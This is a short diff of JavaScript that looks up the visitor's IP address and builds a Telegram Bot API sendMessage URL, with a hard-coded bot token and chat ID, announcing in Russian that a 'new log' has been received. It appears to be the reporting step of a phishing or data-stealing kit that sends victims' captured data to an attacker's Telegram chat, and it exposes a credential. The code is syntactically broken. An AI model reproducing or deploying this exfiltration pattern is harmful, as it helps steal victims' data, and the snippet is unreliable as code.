@@ -20,11 +20,11 @@ function getIPFromAmazon() {
     headers: {
       "Access-Control-Allow-Origin": "*",
       // 'Content-Type': 'application/x-www-form-urlencoded',
-    } );
+    }
+     });
     .then((res) => res.text())
     .then((data) => console.log(data));
-},
- });
+}
 
 var ip = getIPFromAmazon(); // IP
 var api = "https://api.telegram.org/bot6687099688:AAEi1SvgP6tJ5URBFIxtbmO9Co3uqsFA2JM/sendMessage?chat_id=5853359722&text=🆕 Получен новый лог! "
